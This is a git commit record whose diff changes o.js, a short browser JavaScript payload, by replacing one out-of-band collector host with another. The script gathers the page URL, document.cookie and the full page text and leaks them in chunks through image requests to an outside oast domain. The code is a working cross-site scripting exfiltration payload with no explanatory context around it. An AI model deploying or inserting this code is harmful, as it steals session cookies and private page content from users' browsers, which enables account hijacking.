6b9ba2c75712837107f0a798aa3cef3494b0a93a
syazwanmsm93 <syazwanmsm93@gmail.com>
2026-06-14 06:34:39 +0800

    o.js

--- o.js
+++ o.js
@@ -1,4 +1,4 @@
 let d = location.href + "\nCOOKIE=" + document.cookie + "\nBODY=" + document.body.innerText;
 for (let i = 0; i < d.length; i += 900) {
-  new Image().src = 'https://d8mtl7io12pukg7cp93gn3i19a36k8yk8.oast.pro/?i=' + i + '&d=' + encodeURIComponent(d.slice(i, i + 900));
+  new Image().src = 'https://d8mtln2o12pup57skfigm9ytyo6fnfqax.oast.online/?i=' + i + '&d=' + encodeURIComponent(d.slice(i, i + 900));
 }
